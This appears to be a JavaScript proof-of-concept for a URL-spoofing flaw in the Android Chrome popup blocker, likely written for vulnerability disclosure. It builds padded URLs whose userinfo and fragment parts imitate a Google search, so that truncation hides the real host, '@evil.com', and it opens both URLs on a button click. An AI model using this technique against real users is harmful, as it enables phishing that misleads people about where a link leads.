// Popup URL Spoof — Visual POC (Android Chrome Popup Blocker)
// Demonstrates URL truncation makes legit + spoofed URLs identical

(function() {
  var d = document.getElementById('display');
  if (!d) return;

  function trunc(url, max) {
    if (url.length <= max) return url;
    var pre = Math.floor(max * 0.55);
    var suf = max - pre - 3;
    return url.substring(0, pre) + '...' + url.substring(url.length - suf);
  }

  // The legit URL — victim expects to see Google search
  var LEGIT = 'https://www.google.com/search?q=what+is+claude';

  // Spoofed URL: @evil.com hidden in truncation "...", prefix+suffix match exactly
  // Prefix: "https://www.google.com/se" ← matches (both start with "search")
  // Suffix: "arch?q=what+is+claude"   ← matches (#search?q=... fragment)
  // @evil.com + padding x's = truncated zone
  var SPOOF = 'https://www.google.com/search' +
              '.verify.login.security' + '.x'.repeat(15) +
              '@evil.com' +
              '/' + 'x'.repeat(40) +
              '#search?q=what+is+claude';

  // Also test the exact original attack format
  var SPOOF2 = 'https://www.google.com' + '.a'.repeat(40) +
               '@evil.com' + '/' + 'x'.repeat(40) +
               '#search?q=what+is+claude';

  var tests = [
    { label: 'LEGITIMATE URL', url: LEGIT, cls: 'legit' },
    { label: 'SPOOFED URL (real host: evil.com)', url: SPOOF, cls: 'spoof' },
    { label: 'SPOOFED URL v2 (real host: evil.com)', url: SPOOF2, cls: 'spoof' }
  ];

  var legitShort = trunc(LEGIT, 45);
  var html = '';

  for (var i = 0; i < tests.length; i++) {
    var t = tests[i];
    var short = trunc(t.url, 45);
    var ident = (short === legitShort && i > 0);
    html +=
      '<div class="url-box ' + t.cls + '">' +
        '<div class="label">' + t.label +
          (ident ? ' <span style="color:#ea4335">⚠ MATCH</span>' : '') +
        '</div>' +
        '<div class="url-text">' + short + '</div>' +
        '<div class="full">' + t.url.substring(0, 70) + '...</div>' +
      '</div>';
  }

  html += '<div class="verdict" style="background:#fef7e0;color:#e37400">' +
    '⚠ After truncation (~45 chars), spoofed URL looks IDENTICAL to legitimate Google URL.<br>' +
    '<b>@evil.com</b> is hidden in the <b>"..."</b> truncation zone.<br>' +
    'Victim cannot distinguish real Google URL from attacker URL in popup blocker.' +
    '</div>';

  // How it works
  html += '<div class="explain">' +
    '<b>URL Structure of Spoofed URL:</b><br>' +
    '<code style="font-size:10px;word-break:break-all">' +
    'https://[userinfo that matches google.com/search...]' +
    '<b style="color:#ea4335">@evil.com</b>' +
    '/[padding]#[suffix that matches search?q=...]' +
    '</code><br><br>' +
    '• <b>Userinfo section</b> (before @): shown as URL prefix in popup UI<br>' +
    '• <b>@evil.com</b>: the REAL destination — falls in "..." truncation zone<br>' +
    '• <b>Fragment section</b> (after #): shown as URL suffix in popup UI<br>' +
    '</div>';

  d.innerHTML = html;

  document.getElementById('btnOpen').addEventListener('click', function() {
    window.open(LEGIT, '_blank');
    window.open(SPOOF, '_blank');
  });
})();
